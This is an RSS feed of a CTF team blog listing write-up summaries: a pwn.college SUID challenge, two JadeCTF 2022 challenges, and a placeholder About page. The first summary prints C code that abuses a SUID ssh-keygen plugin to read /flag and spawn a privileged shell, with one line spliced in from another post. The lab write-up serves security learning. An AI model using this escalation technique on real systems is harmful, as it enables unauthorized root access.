<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>gentlemen | CTFteam</title>
    <link>https://ge.ntle.men/</link>
    <description>Recent content on gentlemen | CTFteam</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 02 Nov 2022 10:13:52 +0800</lastBuildDate><atom:link href="https://ge.ntle.men/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Level51 General program suid lifting power ideas: ssh-keygen</title>
      <link>https://ge.ntle.men/pwncollege/babysuidlevel51/</link>
      <pubDate>Wed, 02 Nov 2022 10:13:52 +0800</pubDate>
      
      <guid>https://ge.ntle.men/pwncollege/babysuidlevel51/</guid>
      <description>This challenge is part of a series of programs that show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).
I just set the SUID bit on /usr/bin/ssh-keygen. Try to use it to read the flag!
Resolution Write 51.c program #include&amp;lt;stdio.h&amp;gt; #include&amp;lt;stdlib.h&amp;gt; static void inject() __attribute__((constructor)); void C_GetFunctionList(){ printf(&amp;#34;euid:%d\n&amp;#34;,geteuid()); sendfile(1,open(&amp;#34;/flag&amp;#34;,0),0,4096); //system(&amp;#34;cp /bin/bash /tmp/bash &amp;amp;&amp;amp; chmod +s /tmp/bash &amp;amp;&amp;amp; /tmp/bash -p&amp;#34;); char *argvv[]={&amp;#34;bash&amp;#34;,&amp;#34;-p&amp;#34;,NULL}; execvp(&amp;#34;/bin/bash&amp;#34;,argvv); } `output` consists of 41 seemingly random bytes: Compile and run with the -D parameter of ssh-keygen to.</description>
    </item>
    
    <item>
      <title>JadeCTF2022 &#43;&#43;Game</title>
      <link>https://ge.ntle.men/jadectf2022/&#43;&#43;game/</link>
      <pubDate>Tue, 01 Nov 2022 11:29:51 +0800</pubDate>
      
      <guid>https://ge.ntle.men/jadectf2022/&#43;&#43;game/</guid>
      <description>++game is a web challenge that was part of the 2022 Jade CTF. In order to get the flag, we had to beat an impossible game.
Overview After registering, the game greets us with our current score and a button to increase it. Each time we click the button, the score is increased by 1. To protect itself from automated requests, a valid reCAPTCHA token is required to increase the score.</description>
    </item>
    
    <item>
      <title>JadeCTF2022 BitSetGo</title>
      <link>https://ge.ntle.men/jadectf2022/bitsetgo/</link>
      <pubDate>Mon, 31 Oct 2022 21:20:34 +0800</pubDate>
      
      <guid>https://ge.ntle.men/jadectf2022/bitsetgo/</guid>
      <description>Bit Set Go is a reversing challenge that was part of the 2022 Jade CTF. We were given a binary and its output, and had to find the flag.
Overview output consists of 41 seemingly random bytes:
0206541B 175B135B 17375C17 0C3A5C11 37510409 15125C16 370B5811 370D550F 1E2E312B 000C0402 37 bitsetgo is a 64-bit ELF go binary containing debug symbols. By running it, we see that it reads the two files flag.txt and key.</description>
    </item>
    
    <item>
      <title>About Hugo Tanka</title>
      <link>https://ge.ntle.men/about/</link>
      <pubDate>Wed, 01 Jan 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ge.ntle.men/about/</guid>
      <description>Lorem ipsum dolor sit amet, ex has sale ullum corrumpit, sea dicam nostrum sensibus ad. Porro tritani persecuti te sed. Omittam dissentias pro ex. Atqui luptatum duo id. Eros minim eam ex, novum elitr accusam quo in. Nec ne audire euripidis, mea qualisque consetetur cu. Suspendisse volutpat sem a risus euismod convallis.
In modus congue feugait eos. In nec nonumy volutpat corrumpit, sea assentior quaerendum no, cum affert scripta ea. No nihil voluptaria pro.</description>
    </item>
    
  </channel>
</rss>
